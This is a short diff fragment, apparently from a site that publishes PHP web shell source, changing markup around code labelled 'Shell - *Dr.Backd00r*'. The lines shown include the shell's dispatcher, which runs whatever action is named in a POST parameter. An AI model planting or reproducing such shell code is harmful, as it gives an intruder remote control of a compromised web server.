             $w=@fopen($f,"w") or @function_exists('file_put_contents'); 
@@ -2851,7 +2851,7 @@ if( empty($_POST['a']) )
         $_POST['a'] = 'SecInfo'; 
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) 
     call_user_func('action' . $_POST['a']); 
-?&gt; 
+?> 
 &lt;div id="cot_tl_fixed"&gt;&lt;marquee&gt;Shell - *Dr.Backd00r*  - SubhashDasyam.com&lt;/marquee&gt;&lt;/div&gt; 
  &lt;/marquee&gt;&lt;/div&gt;
-</pre>
+{% endhighlight %}
